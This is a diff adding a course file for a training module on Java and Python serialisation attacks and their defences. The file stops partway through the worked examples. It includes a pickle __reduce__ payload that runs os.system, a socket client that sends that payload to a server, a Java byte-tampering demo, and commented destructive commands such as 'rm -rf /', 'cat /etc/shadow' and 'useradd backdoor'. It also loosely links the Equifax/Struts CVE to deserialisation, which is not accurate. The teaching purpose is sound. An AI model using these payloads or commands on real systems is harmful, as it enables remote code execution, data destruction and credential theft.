@@ -1,0 +1,1603 @@
+{
+  "course_id": "serialisation_attacks",
+  "title": "Serialisation Attacks & Defences",
+  "description": "Master serialisation, deserialisation attacks, and secure data handling in Java and Python — from normal use to exploitation to defence.",
+  "difficulty": "ADVANCED",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "java_classes_objects",
+    "java_oop_concepts"
+  ],
+  "learning_outcomes": [
+    "Explain what serialisation and deserialisation are and why they are needed",
+    "Describe the internal structure of Java serialised byte streams",
+    "Demonstrate how attackers tamper with serialised data to change program behaviour",
+    "Exploit Python pickle deserialisation to achieve Remote Code Execution (RCE)",
+    "Implement secure serialisation using JSON, input validation, and class whitelisting",
+    "Apply CWE-502 mitigations including ObjectInputFilter, restricted unpickler, and HMAC signing",
+    "Evaluate when serialisation is safe vs. dangerous based on trust boundaries",
+    "Design defence-in-depth strategies for applications that handle serialised data"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Warns clearly about pickle.loads() danger on untrusted data = Remote Code Execution risk (CWE-502).",
+    "intervention_triggers": {
+      "idle_40_seconds": "Hey! Serialisation can feel abstract at first — think of it like packing a suitcase. Want me to walk through this step by step?",
+      "idle_90_seconds": "Still thinking? That's completely fine! Serialisation has lots of moving parts. Let me break it down with a simple analogy — imagine sending a letter vs. sending a whole package...",
+      "idle_180_seconds": "No rush at all! Let me try explaining this differently. Think of serialisation like taking a photo of an object — you capture its state so you can recreate it later. The danger is when someone swaps your photo with a fake one...",
+      "first_error": "Great attempt! Errors are how we learn. Let me highlight the key part you might want to look at again...",
+      "repeated_errors": "I can see this one is tricky! Let's slow down and trace through the code together, line by line. No judgement — this is exactly how security experts learn.",
+      "after_success": "Brilliant! You just demonstrated a real security concept that professional pentesters use. Keep going — you're building serious skills!"
+    },
+    "encouragement_phrases": [
+      "You're thinking like a security researcher!",
+      "That's exactly how real-world exploits work — great job spotting it!",
+      "Serialisation bugs have caused massive breaches — and now you understand why!",
+      "Every exercise you complete makes you a better secure developer!",
+      "Don't worry if this feels complex — even experienced devs find serialisation tricky!",
+      "You just prevented a Remote Code Execution attack — that's impressive!",
+      "Understanding CWE-502 puts you ahead of most developers!",
+      "Take your time — security is about careful thinking, not speed!"
+    ],
+    "explanation_styles": {
+      "analogy": "Serialisation is like freeze-drying food: you convert it to a compact form for transport, then rehydrate it later. The danger? Someone could swap your freeze-dried meal with poison, and you'd only discover it when you eat it.",
+      "visual": "Think of the byte stream as a recipe card: header (ac ed) = recipe title, metadata = ingredient list, values = actual amounts. An attacker changes the amounts to create something toxic.",
+      "step_by_step": "Step 1: Object lives in memory. Step 2: writeObject() converts it to bytes. Step 3: Bytes travel over network or to file. Step 4: readObject() recreates the object. DANGER: If bytes were tampered with between Step 3 and 4, the recreated object could be malicious.",
+      "code_trace": "Let's trace through the bytes: ac ed = magic number (says 'I am a Java serialised stream'), 00 05 = version 5, 73 = 'here comes an object', 72 = 'here is the class description'...",
+      "comparison": "JSON vs. native serialisation: JSON carries only DATA (safe). Native serialisation carries DATA + CLASS INFO + METHOD CALLS (dangerous). That's why pickle.loads() can execute code but json.loads() cannot."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "serialisation_attacks_lesson_1",
+      "title": "Serialisation Attacks & Defences: Normal → Attack → Mitigation",
+      "theory": {
+        "introduction": "Imagine you have a beautiful sandcastle on the beach. You want to show it to a friend who lives far away, but you cannot move the beach. So you take detailed measurements, photographs, and notes — enough information to rebuild the exact same sandcastle elsewhere. That process of converting something complex into a portable format is called serialisation. Your friend receives your notes, rebuilds the sandcastle, and that rebuilding process is called deserialisation.\n\nIn programming, serialisation converts an object in memory into a stream of bytes that can be stored in a file, saved to a database, or sent across a network. Deserialisation reverses the process — it takes those bytes and reconstructs the original object.\n\nThis sounds harmless, right? Here is the problem: what if someone intercepts your sandcastle notes and changes them? Instead of rebuilding your sandcastle, your friend unknowingly builds a trapdoor. In the digital world, attackers can tamper with serialised data to corrupt objects, bypass authentication, or even execute arbitrary commands on a server. This is CWE-502: Deserialization of Untrusted Data — one of the most dangerous vulnerabilities in software today.\n\nIn this module, you will learn how serialisation works normally (in Java and Python), how attackers exploit it, and how to defend against these attacks using industry-standard techniques like JSON alternatives, class whitelisting, HMAC signing, and restricted deserialisers.",
+        "why_important": "Serialisation vulnerabilities have caused some of the most devastating security breaches in history. The 2017 Apache Struts vulnerability (CVE-2017-5638) that led to the Equifax breach exposing 147 million records involved unsafe deserialisation. The Log4Shell vulnerability (CVE-2021-44228) also exploited deserialisation-like behaviour. CWE-502 (Deserialization of Untrusted Data) consistently appears in the OWASP Top 10 under A08:2021 Software and Data Integrity Failures. If your application deserialises data from untrusted sources without validation, an attacker can achieve Remote Code Execution (RCE) — meaning they can run ANY command on your server. Understanding this vulnerability and its mitigations is essential for every developer building networked applications.",
+        "key_concepts": [
+          {
+            "concept": "What is Serialisation?",
+            "explanation": "Serialisation is the process of converting an object in memory into a sequence of bytes that can be stored or transmitted. Think of it like packing a suitcase: you take all the items (object fields) and arrange them in a specific order inside the case (byte stream). The key reason we need serialisation is that objects in memory have complex structures — pointers, references, inheritance hierarchies — that only make sense within the running program. To save this state to a file, send it over a network, or transfer it to another machine with a different architecture, we need a standardised byte format.",
+            "example": "import java.io.*;\n\n// A simple class that can be serialised\npublic class UserProfile implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String username;\n    private int score;\n\n    public UserProfile(String username, int score) {\n        this.username = username;\n        this.score = score;\n    }\n\n    @Override\n    public String toString() {\n        return username + \" (Score: \" + score + \")\";\n    }\n}",
+            "ai_hint": "Think of Serializable as a label on the suitcase saying 'this is allowed through airport security'. Without it, Java refuses to pack the object."
+          },
+          {
+            "concept": "What is Deserialisation?",
+            "explanation": "Deserialisation is the reverse process — it reads a byte stream and reconstructs the original object in memory. Think of unpacking that suitcase: you take items out in the same order they were packed and put them back where they belong. The deserialisation process reads the header bytes to verify the stream format, then reads class metadata to know what type of object to create, and finally reads field values to populate the object. In Java, this uses ObjectInputStream.readObject(). In Python, this uses pickle.loads().",
+            "example": "import java.io.*;\n\npublic class DeserialiseExample {\n    public static void main(String[] args) {\n        try {\n            // Read serialised object from file\n            FileInputStream fis = new FileInputStream(\"user.ser\");\n            ObjectInputStream ois = new ObjectInputStream(fis);\n            UserProfile user = (UserProfile) ois.readObject();\n            ois.close();\n            System.out.println(\"Loaded: \" + user);\n        } catch (Exception e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
+            "ai_hint": "The danger is that readObject() trusts the bytes completely. If someone tampered with the file, you could be reconstructing a malicious object!"
+          },
+          {
+            "concept": "Java Serialised Byte Stream Structure",
+            "explanation": "When Java serialises an object, it produces a specific byte format. The stream always starts with the magic bytes 'ac ed' followed by version '00 05'. Then comes the class description: class name, serial version UID (8 bytes), number of fields, and field types. After the metadata, the actual field values follow sequentially. For complex objects with inheritance, the superclass description is included too. Understanding this structure is crucial because attackers who know the format can modify specific bytes to change field values — for example, changing a user's balance from 100 to 999999.",
+            "example": "// Java serialised byte stream breakdown:\n// ac ed 00 05  → Magic header + version 5\n// 73           → TC_OBJECT (new object follows)\n// 72           → TC_CLASSDESC (class description follows)\n// 00 11        → Class name length (17 chars)\n// 6a 61 76 61 2e 6c 61 6e 67 2e 49 6e 74 65 67 65 72\n//              → \"java.lang.Integer\"\n// 12 e2 a0 a4 f7 81 87 38 → serialVersionUID\n// 02           → Supports serialisation\n// 00 01        → Number of fields (1)\n// 49           → Field type 'I' (int)\n// 00 05 76 61 6c 75 65 → Field name \"value\"\n// 00 00 00 01  → The actual value: 1",
+            "ai_hint": "The magic bytes 'ac ed' are like a file signature. Security tools use them to detect serialised Java objects in network traffic — if you see 'ac ed 00 05' in a request, someone is sending serialised Java data!"
+          },
+          {
+            "concept": "Serialisation Use Cases",
+            "explanation": "There are two main legitimate use cases for serialisation. First: saving complex objects for later use — you serialise game state, user sessions, or configuration to a file and deserialise them later. This is safe because you control both ends. Second: transferring data between protected servers — you send objects from Server A to Server B over an encrypted channel like TLS. This is also safe if you control both servers and the channel is tamper-proof. The common factor? Serialisation is safest when the data source is completely trusted. The moment untrusted data enters the deserialisation pipeline, you have a potential vulnerability.",
+            "example": "// SAFE: Saving your own game state to a file\nGameState state = new GameState(player, level, inventory);\nObjectOutputStream oos = new ObjectOutputStream(\n    new FileOutputStream(\"savegame.dat\"));\noos.writeObject(state);\noos.close();\n\n// DANGEROUS: Deserialising data from a user upload!\n// An attacker could upload a crafted .dat file\nObjectInputStream ois = new ObjectInputStream(\n    request.getInputStream());  // ← NEVER DO THIS!\nObject obj = ois.readObject();  // ← Could execute malicious code",
+            "ai_hint": "Ask yourself: 'Who created these bytes?' If the answer is 'my own program' — probably safe. If the answer is 'a user, a client, or the internet' — DANGER!"
+          },
+          {
+            "concept": "Data Tampering Attack on Serialised Bytes",
+            "explanation": "One of the simplest serialisation attacks involves directly modifying bytes in a serialised stream. Because the format is well-documented, an attacker who can intercept the byte stream can change specific values. For example, if integers are stored as 4-byte big-endian values in the stream, changing '00 00 00 03' to '00 00 00 05' changes the value from 3 to 5. In a banking application, this could mean changing a transaction amount. In a game, it could mean changing a score. The deserialiser has no way to detect this tampering unless the data is signed or encrypted.",
+            "example": "// Original serialised data contains: [1, 2, 3, 4]\n// Byte stream includes: ... 00 00 00 03 ... (value 3)\n\n// Attacker intercepts and changes to:\n// ... 00 00 00 05 ... (value 5)\n\n// After deserialisation: [1, 2, 5, 4]\n// The attacker changed the third value without\n// any authentication or authorisation!",
+            "ai_hint": "This is like someone opening your sealed letter, changing the amount on a cheque, and resealing it. Without a signature or checksum, the recipient cannot tell it was modified."
+          },
+          {
+            "concept": "Python pickle Remote Code Execution (RCE)",
+            "explanation": "Python's pickle module is extremely powerful — and extremely dangerous. When an object defines a __reduce__() method, pickle calls it during serialisation. The __reduce__() method returns a tuple: (callable, args). During deserialisation, pickle calls callable(*args) to reconstruct the object. An attacker can override __reduce__() to return (os.system, ('malicious_command',)) — and when the server calls pickle.loads() on this data, it executes the command. This is a full Remote Code Execution vulnerability. The Python documentation itself warns: 'The pickle module is not secure. Only unpickle data you trust.' This is CWE-502 in its most dangerous form.",
+            "example": "import pickle\nimport os\n\n# ATTACKER'S malicious class\nclass MaliciousPayload:\n    def __reduce__(self):\n        # This will execute on the SERVER when unpickled!\n        return (os.system, ('echo HACKED > /tmp/pwned.txt',))\n\n# Attacker serialises and sends to server\npayload = pickle.dumps(MaliciousPayload())\n# When server does pickle.loads(payload)...\n# ...it executes: os.system('echo HACKED > /tmp/pwned.txt')",
+            "ai_hint": "WARNING: pickle.loads() on untrusted data = Remote Code Execution. NEVER use pickle.loads() on data from users, clients, or the internet. Use JSON instead!"
+          },
+          {
+            "concept": "Server Privilege and Attack Impact",
+            "explanation": "The severity of a serialisation attack depends on the privileges of the process that deserialises the data. If a web server runs as root (the superuser), an attacker who achieves RCE through deserialisation can do anything: delete all files, install malware, create backdoor accounts, exfiltrate databases. Even with lower privileges, the attacker can still delete all data the process can write, read sensitive configuration files, pivot to other services on the network, or use the server as a launching point for further attacks. This is why running services with least privilege is a critical defence.",
+            "example": "# If server runs as root, attacker can:\n# os.system('rm -rf /')          ← Delete everything\n# os.system('cat /etc/shadow')    ← Read password hashes\n# os.system('useradd backdoor')   ← Create admin account\n\n# If server runs as www-data (limited user):\n# os.system('rm -rf /var/www/')   ← Delete web files\n# os.system('cat /var/www/config.py') ← Read DB passwords\n\n# MITIGATION: Always run services with LEAST PRIVILEGE\n# Never run web servers as root!",
+            "ai_hint": "Think of privileges like keys: root has the master key to every room. A limited user only has keys to their office. If a burglar steals your keys, how much damage can they do?"
+          },
+          {
+            "concept": "JSON: A Safer Alternative to Native Serialisation",
+            "explanation": "JSON (JavaScript Object Notation) is a text-based data format that is fundamentally safer than native serialisation. Why? Because JSON only contains structured DATA — it has no concept of class metadata, method calls, or code execution. When you call JSON.parse() in JavaScript or json.loads() in Python, it can only produce basic types: strings, numbers, booleans, arrays, and objects. It cannot instantiate arbitrary classes or call system commands. However, JSON from untrusted sources still needs validation — you should check that values meet expected types, ranges, and formats. Also, NEVER use eval() on JSON text, because eval() CAN execute arbitrary code.",
+            "example": "import json\n\n# SAFE: JSON cannot execute code\ndata = json.loads('{\"username\": \"alice\", \"score\": 42}')\nprint(data['username'])  # alice\nprint(data['score'])     # 42\n\n# STILL VALIDATE! Check types and ranges:\nif not isinstance(data['score'], int):\n    raise ValueError('Score must be an integer')\nif data['score'] < 0 or data['score'] > 1000000:\n    raise ValueError('Score out of range')\n\n# DANGEROUS: Never use eval() on JSON!\n# obj = eval(json_string)  ← NEVER DO THIS",
+            "ai_hint": "JSON is like a text message — it can only contain words and numbers. Native serialisation is like receiving a package — it could contain anything, even something dangerous."
+          },
+          {
+            "concept": "Serialisation Risk Mitigations",
+            "explanation": "There are five key strategies for mitigating serialisation risks. (1) Class-specific serialisation methods: write custom writeObject/readObject that exclude sensitive fields like passwords. (2) Safe deserialisation practices: ensure readObject() does not cause side effects; validate all fields after reconstruction. (3) Handle untrusted data: avoid deserialising from untrusted sources entirely; use JSON or XML instead. (4) Secure storage: protect serialised data with access control, digital signatures (HMAC), or encryption so tampering is detected. (5) Sanitise deserialised data: use a temporary object to validate all fields before using the real object; reject anything that looks suspicious.",
+            "example": "// Strategy 1: Exclude sensitive fields with 'transient'\npublic class User implements Serializable {\n    private String username;\n    private transient String password; // NOT serialised!\n    private transient String creditCard; // NOT serialised!\n}\n\n// Strategy 4: Sign serialised data with HMAC\nimport javax.crypto.Mac;\nimport javax.crypto.spec.SecretKeySpec;\n\nbyte[] serialisedData = serialise(myObject);\nMac mac = Mac.getInstance(\"HmacSHA256\");\nmac.init(new SecretKeySpec(secretKey, \"HmacSHA256\"));\nbyte[] signature = mac.doFinal(serialisedData);\n// Send both serialisedData + signature\n// Receiver verifies signature BEFORE deserialising",
+            "ai_hint": "The 'transient' keyword is like putting a sticky note on your suitcase saying 'do NOT pack this item'. Java will skip that field during serialisation."
+          },
+          {
+            "concept": "Java ObjectInputFilter (Class Whitelisting)",
+            "explanation": "Since Java 9, the ObjectInputFilter API allows you to restrict which classes can be deserialised. This is like an airport security checkpoint that only allows approved items through. You create a filter that whitelists specific classes and rejects everything else. If an attacker sends a serialised object containing a malicious class (like Runtime or ProcessBuilder), the filter blocks it before readObject() processes it. This is one of the most effective defences against Java deserialisation attacks.",
+            "example": "import java.io.*;\n\npublic class SafeDeserialiser {\n    public static Object deserialise(byte[] data) throws Exception {\n        ByteArrayInputStream bis = new ByteArrayInputStream(data);\n        ObjectInputStream ois = new ObjectInputStream(bis);\n\n        // Only allow UserProfile and basic Java types\n        ois.setObjectInputFilter(filterInfo -> {\n            Class<?> clazz = filterInfo.serialClass();\n            if (clazz == null) return ObjectInputFilter.Status.UNDECIDED;\n            if (clazz == UserProfile.class) return ObjectInputFilter.Status.ALLOWED;\n            if (clazz == String.class) return ObjectInputFilter.Status.ALLOWED;\n            if (clazz == Integer.class) return ObjectInputFilter.Status.ALLOWED;\n            return ObjectInputFilter.Status.REJECTED;\n        });\n\n        return ois.readObject();\n    }\n}",
+            "ai_hint": "ObjectInputFilter is your bouncer at the door. It checks every class trying to get in and only lets approved ones through. Everything else gets rejected!"
+          },
+          {
+            "concept": "Python Restricted Unpickler",
+            "explanation": "Python provides a way to restrict what pickle can deserialise by subclassing pickle.Unpickler and overriding the find_class() method. The default find_class() can load ANY module and class — that is why os.system gets called during an attack. By overriding find_class(), you create a whitelist of allowed modules and classes. If the serialised data tries to reference os.system, subprocess.call, or any other dangerous callable, your restricted unpickler raises an exception instead of executing it. This is the mitigation demonstrated in security training exercises.",
+            "example": "import pickle\nimport io\n\n# Only allow specific safe modules and classes\nALLOWED_MODULES_CLASSES = {\n    'codec': {'myDecode', 'myEncode'},\n    'builtins': {'str', 'int', 'float', 'list', 'dict'},\n}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module in ALLOWED_MODULES_CLASSES:\n            if name in ALLOWED_MODULES_CLASSES[module]:\n                return super().find_class(module, name)\n        raise pickle.UnpicklingError(\n            f'Blocked: {module}.{name} is not allowed!')\n\ndef safe_loads(data):\n    return RestrictedUnpickler(io.BytesIO(data)).load()\n\n# Now os.system is blocked!\n# safe_loads(malicious_payload) → raises UnpicklingError",
+            "ai_hint": "RestrictedUnpickler is like a customs officer checking every package. Only items on the approved list get through — everything else is seized!"
+          },
+          {
+            "concept": "CWE-502: Deserialization of Untrusted Data",
+            "explanation": "CWE-502 is the official classification for deserialisation vulnerabilities. It states: 'The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.' This CWE applies to any language: Java (ObjectInputStream), Python (pickle.loads), PHP (unserialize), .NET (BinaryFormatter), Ruby (Marshal.load). The impact ranges from data corruption to authentication bypass to full Remote Code Execution. CWE-502 is referenced by OWASP A08:2021 (Software and Data Integrity Failures) and is consistently ranked in the CWE Top 25 Most Dangerous Software Weaknesses. The CIA impact: Confidentiality (attacker reads sensitive data), Integrity (attacker modifies objects/data), Availability (attacker crashes the application or deletes data).",
+            "example": "// CWE-502 in different languages:\n\n// JAVA — Dangerous:\nObjectInputStream ois = new ObjectInputStream(untrustedInput);\nObject obj = ois.readObject(); // ← CWE-502!\n\n// PYTHON — Dangerous:\nobj = pickle.loads(untrusted_bytes) // ← CWE-502!\n\n// PHP — Dangerous:\n$obj = unserialize($untrusted_string); // ← CWE-502!\n\n// .NET — Dangerous:\nBinaryFormatter bf = new BinaryFormatter();\nobject obj = bf.Deserialize(untrustedStream); // ← CWE-502!",
+            "ai_hint": "CWE-502 is language-independent — every language that supports native serialisation has this risk. The defence is always the same: never deserialise untrusted data without validation!"
+          },
+          {
+            "concept": "Dependable Systems and Serialisation",
+            "explanation": "Serialisation vulnerabilities directly impact system dependability — the degree to which users can trust a system. Dependability has five dimensions: Availability (system is accessible when needed), Reliability (system works correctly over time), Safety (system does not cause harm), Security (system resists intrusion), and Resilience (system maintains service during attacks). A serialisation exploit can compromise ALL five: it can crash the system (availability), corrupt data (reliability), cause physical harm in IoT systems (safety), provide unauthorised access (security), and disable recovery mechanisms (resilience). Defence strategies include redundancy (backup systems), diversity (different implementations), and formal verification of critical components.",
+            "example": "// Dependability example: defence in depth for serialisation\n\n// Layer 1: Input validation — reject unexpected content types\nif (!contentType.equals(\"application/json\")) {\n    return error(415, \"Only JSON accepted\");\n}\n\n// Layer 2: Use JSON instead of native serialisation\nUserData data = gson.fromJson(jsonString, UserData.class);\n\n// Layer 3: Validate all fields after parsing\nif (data.getScore() < 0 || data.getScore() > MAX_SCORE) {\n    return error(400, \"Invalid score\");\n}\n\n// Layer 4: Least privilege — run service as limited user\n// Layer 5: Monitoring — log all deserialisation attempts",
+            "ai_hint": "Defence in depth means no single failure should compromise the whole system. Even if one layer fails, the next layer catches the attack — like multiple security checkpoints at an airport."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Normal Java Serialisation (Saving an Object to File)",
+          "description": "Demonstrates the standard, safe way to serialise a Java object to a file — the NORMAL operation before any attack.",
+          "difficulty": "beginner",
+          "code": "import java.io.*;\n\nclass GameState implements Serializable {\n    private static final long serialVersionUID = 1L;\n    String playerName;\n    int level;\n    int score;\n\n    public GameState(String name, int level, int score) {\n        this.playerName = name;\n        this.level = level;\n        this.score = score;\n    }\n\n    public String toString() {\n        return playerName + \" | Level: \" + level + \" | Score: \" + score;\n    }\n}\n\npublic class SerialiseToFile {\n    public static void main(String[] args) throws Exception {\n        GameState game = new GameState(\"Alice\", 5, 2500);\n        System.out.println(\"Before save: \" + game);\n\n        // Serialise to file\n        ObjectOutputStream oos = new ObjectOutputStream(\n            new FileOutputStream(\"game.ser\"));\n        oos.writeObject(game);\n        oos.close();\n        System.out.println(\"Game saved to game.ser\");\n    }\n}",
+          "output": "Before save: Alice | Level: 5 | Score: 2500\nGame saved to game.ser",
+          "ai_explanation": "This is NORMAL serialisation: we create a GameState object and save it to a file. The class implements Serializable (required by Java). ObjectOutputStream.writeObject() converts the object to bytes and writes them to 'game.ser'. The serialVersionUID ensures version compatibility. This is safe because WE control both the writing and the reading.",
+          "ai_challenge": "Try adding a 'health' field to GameState and serialise it. What happens if you try to deserialise an old file that does not have the health field?"
+        },
+        {
+          "title": "Example 2: Normal Java Deserialisation (Loading from File)",
+          "description": "Shows how to safely deserialise an object from a file that YOUR OWN program created.",
+          "difficulty": "beginner",
+          "code": "import java.io.*;\n\npublic class DeserialiseFromFile {\n    public static void main(String[] args) throws Exception {\n        // Deserialise from file\n        ObjectInputStream ois = new ObjectInputStream(\n            new FileInputStream(\"game.ser\"));\n        GameState loaded = (GameState) ois.readObject();\n        ois.close();\n\n        System.out.println(\"Loaded: \" + loaded);\n        System.out.println(\"Level: \" + loaded.level);\n        System.out.println(\"Score: \" + loaded.score);\n    }\n}",
+          "output": "Loaded: Alice | Level: 5 | Score: 2500\nLevel: 5\nScore: 2500",
+          "ai_explanation": "ObjectInputStream.readObject() reads the bytes from the file, checks the magic header (ac ed 00 05), reads the class metadata, and reconstructs the GameState object with all its original field values. This is safe here because we wrote the file ourselves. The danger comes when someone ELSE writes the file.",
+          "ai_challenge": "What happens if you delete the game.ser file and try to deserialise? What exception do you get?"
+        },
+        {
+          "title": "Example 3: Inspecting Java Serialised Bytes",
+          "description": "Shows the actual byte structure of a serialised Java Integer array — directly from the serialisation specification.",
+          "difficulty": "intermediate",
+          "code": "import java.io.*;\nimport java.util.*;\n\npublic class InspectBytes {\n    public static void main(String[] args) throws Exception {\n        // Serialise an Integer to see its bytes\n        Integer value = 42;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(value);\n        oos.close();\n\n        byte[] bytes = baos.toByteArray();\n        System.out.println(\"Serialised \" + bytes.length + \" bytes:\");\n        for (int i = 0; i < bytes.length; i++) {\n            System.out.printf(\"%02x \", bytes[i] & 0xFF);\n            if ((i + 1) % 16 == 0) System.out.println();\n        }\n        System.out.println();\n        System.out.println(\"First 4 bytes: ac ed 00 05 = Java serialisation magic header\");\n    }\n}",
+          "output": "Serialised 81 bytes:\nac ed 00 05 73 72 00 11 6a 61 76 61 2e 6c 61 6e\n67 2e 49 6e 74 65 67 65 72 ...\nFirst 4 bytes: ac ed 00 05 = Java serialisation magic header",
+          "ai_explanation": "This shows the raw bytes that Java produces. The 'ac ed 00 05' header is how you recognise Java serialised data in network traffic or files. After the header comes class description ('java.lang.Integer'), the serialVersionUID, field metadata, and finally the actual integer value (00 00 00 2a = 42 in hex).",
+          "ai_challenge": "Try serialising a String like \"Hello\" instead. How does the byte structure differ from an Integer?"
+        },
+        {
+          "title": "Example 4: Normal Python Serialisation with pickle",
+          "description": "Shows normal, safe use of Python pickle when YOU control both ends.",
+          "difficulty": "beginner",
+          "code": "import pickle\n\n# A normal object to serialise\nuser_data = {\n    'username': 'alice',\n    'score': 2500,\n    'level': 5,\n    'inventory': ['sword', 'shield', 'potion']\n}\n\n# Serialise (pickle)\nserialised = pickle.dumps(user_data)\nprint(f'Serialised {len(serialised)} bytes')\nprint(f'Raw bytes: {serialised[:30]}...')\n\n# Deserialise (unpickle)\nloaded = pickle.loads(serialised)\nprint(f'Loaded: {loaded}')\nprint(f'Username: {loaded[\"username\"]}')\nprint(f'Score: {loaded[\"score\"]}')",
+          "output": "Serialised 98 bytes\nRaw bytes: b'\\x80\\x05\\x95Y\\x00...'...\nLoaded: {'username': 'alice', 'score': 2500, 'level': 5, 'inventory': ['sword', 'shield', 'potion']}\nUsername: alice\nScore: 2500",
+          "ai_explanation": "pickle.dumps() converts the Python dictionary into bytes. pickle.loads() reverses the process. This is safe because we created the data ourselves. The danger starts when pickle.loads() is called on data from an external source — a network socket, user upload, or API request.",
+          "ai_challenge": "What is the difference between pickle.dumps()/loads() (bytes) and pickle.dump()/load() (files)? Try saving to a file instead."
+        },
+        {
+          "title": "Example 5: Python Custom __reduce__ Method (Normal Use)",
+          "description": "Shows how __reduce__ works for LEGITIMATE custom serialisation — before seeing how attackers abuse it.",
+          "difficulty": "intermediate",
+          "code": "import pickle\n\nclass Temperature:\n    def __init__(self, celsius):\n        self.celsius = celsius\n        self.fahrenheit = celsius * 9/5 + 32\n\n    def __reduce__(self):\n        # Tell pickle: to recreate me, call Temperature(celsius)\n        return (Temperature, (self.celsius,))\n\n    def __repr__(self):\n        return f'{self.celsius}°C / {self.fahrenheit}°F'\n\n# Normal use\ntemp = Temperature(100)\nprint(f'Original: {temp}')\n\ndata = pickle.dumps(temp)\nrestored = pickle.loads(data)\nprint(f'Restored: {restored}')",
+          "output": "Original: 100°C / 212.0°F\nRestored: 100°C / 212.0°F",
+          "ai_explanation": "__reduce__ tells pickle how to reconstruct the object. It returns a tuple: (callable, args). pickle.loads() calls callable(*args) — here that means Temperature(100). This is the LEGITIMATE use. The ATTACK version replaces Temperature with os.system and the argument with a shell command.",
+          "ai_challenge": "What happens if you change __reduce__ to return (print, ('Hello from reduce!',))? Try it!"
+        },
+        {
+          "title": "Example 6: Server-Client Pickle Communication (Normal Operation)",
+          "description": "A client sends serialised data to a server over a socket — demonstrates normal operation before the attack.",
+          "difficulty": "intermediate",
+          "code": "# === codec.py (shared between client and server) ===\ndef myEncode(data):\n    return data.encode('utf-8')\n\ndef myDecode(data):\n    return data.decode('utf-8')\n\n# === client.py (sends data) ===\nimport pickle, socket\nimport codec\n\nclass DataPacket:\n    data = 'Hello Server!'\n\n    def __reduce__(self):\n        encoded = codec.myEncode(self.data)\n        return (codec.myDecode, (encoded,))\n\nobj = DataPacket()\nobj.data = 'Status report: All systems normal'\npayload = pickle.dumps(obj)\n\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsoc.connect(('localhost', 10014))\nresponse = soc.recv(1024)\nsoc.send(payload)\nsoc.close()",
+          "output": "Client sends: Status report: All systems normal\nServer receives and prints: Server Received: Status report: All systems normal",
+          "ai_explanation": "The client creates a DataPacket, serialises it with pickle.dumps(), and sends the bytes over a TCP socket. The server receives the bytes and calls pickle.loads() to reconstruct the string. The __reduce__ method uses codec.myEncode/myDecode for the transformation. This is the NORMAL operation that works correctly.",
+          "ai_challenge": "What would happen if the server used json.dumps/json.loads instead of pickle? Would the __reduce__ method still be called?"
+        },
+        {
+          "title": "Example 7: ATTACK — Python pickle Remote Code Execution",
+          "description": "Shows how an attacker modifies the client to execute arbitrary commands on the server via pickle deserialisation.",
+          "difficulty": "advanced",
+          "code": "import pickle, os, socket\n\n# ATTACKER's malicious class — replaces the normal client\nclass Exploit:\n    def __reduce__(self):\n        # Instead of codec.myDecode, call os.system!\n        # This runs a shell command on the SERVER\n        return (os.system, ('echo ATTACK_SUCCESSFUL',))\n\n# Serialise the malicious object\npayload = pickle.dumps(Exploit())\n\n# Send to the unsuspecting server\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsoc.connect(('localhost', 10014))\nresponse = soc.recv(1024)\nsoc.send(payload)\nsoc.close()\n\n# On the server terminal, you will see:\n# ATTACK_SUCCESSFUL\n# Server Received: 0\n# The '0' is the return code of os.system()",
+          "output": "Server terminal shows:\nATTACK_SUCCESSFUL\nServer Received: 0",
+          "ai_explanation": "The attacker replaced __reduce__ to return (os.system, ('echo ATTACK_SUCCESSFUL',)). When the server calls pickle.loads(payload), Python sees the tuple, calls os.system('echo ATTACK_SUCCESSFUL'), and the command runs ON THE SERVER. The server prints '0' because os.system returns the exit code. A real attacker would use destructive commands instead of echo.",
+          "ai_challenge": "Why does the server print 'Server Received: 0' after the attack? What does the 0 represent?"
+        },
+        {
+          "title": "Example 8: ATTACK — Java Byte Tampering",
+          "description": "Shows how an attacker modifies serialised Java bytes to change values without any authentication.",
+          "difficulty": "advanced",
+          "code": "import java.io.*;\nimport java.util.*;\n\npublic class ByteTamperingDemo {\n    public static void main(String[] args) throws Exception {\n        // NORMAL: Serialise array [1, 2, 3, 4]\n        int[] original = {1, 2, 3, 4};\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(original);\n        oos.close();\n        byte[] data = baos.toByteArray();\n\n        // ATTACK: Find and change value 3 → 99\n        for (int i = 0; i < data.length - 3; i++) {\n            // Look for 00 00 00 03 (integer 3)\n            if (data[i]==0 && data[i+1]==0 && data[i+2]==0 && data[i+3]==3) {\n                data[i+3] = 99; // Change 3 to 99!\n                System.out.println(\"Tampered byte at offset \" + i);\n                break;\n            }\n        }\n\n        // Deserialise tampered data\n        ObjectInputStream ois = new ObjectInputStream(\n            new ByteArrayInputStream(data));\n        int[] tampered = (int[]) ois.readObject();\n        System.out.println(\"Original: \" + Arrays.toString(original));\n        System.out.println(\"Tampered: \" + Arrays.toString(tampered));\n    }\n}",
+          "output": "Tampered byte at offset 27\nOriginal: [1, 2, 3, 4]\nTampered: [1, 2, 99, 4]",
+          "ai_explanation": "The attacker searches the byte stream for the pattern '00 00 00 03' (integer 3 in big-endian) and changes it to '00 00 00 63' (integer 99). The deserialiser has no way to detect this modification because there is no signature or checksum. In a real scenario, this could change a bank balance, a user role, or an access level.",
+          "ai_challenge": "How would you prevent this tampering? Think about what additional data you could add to the stream to detect modifications."
+        },
+        {
+          "title": "Example 9: MITIGATION — Python Restricted Unpickler",
